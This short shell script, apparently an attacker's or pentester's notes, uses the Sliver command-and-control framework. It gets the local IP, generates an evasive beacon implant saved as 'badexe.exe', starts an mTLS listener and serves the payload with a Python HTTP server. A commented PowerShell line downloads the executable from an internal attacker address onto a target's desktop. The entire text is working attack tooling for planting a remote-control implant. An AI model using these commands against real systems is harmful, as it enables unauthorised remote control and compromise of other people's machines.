ip=ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'  
sliver
generate beacon -m $ip -e -t 3 -s /root/badexe.exe
mtls

exit
python3 -m http.server 8000 -d /root/ &
#iwr http://192.168.242.130:8000/ELEGANT_DIAPHRAGM.exe -o ~/desktop/elegant_diaphram.exe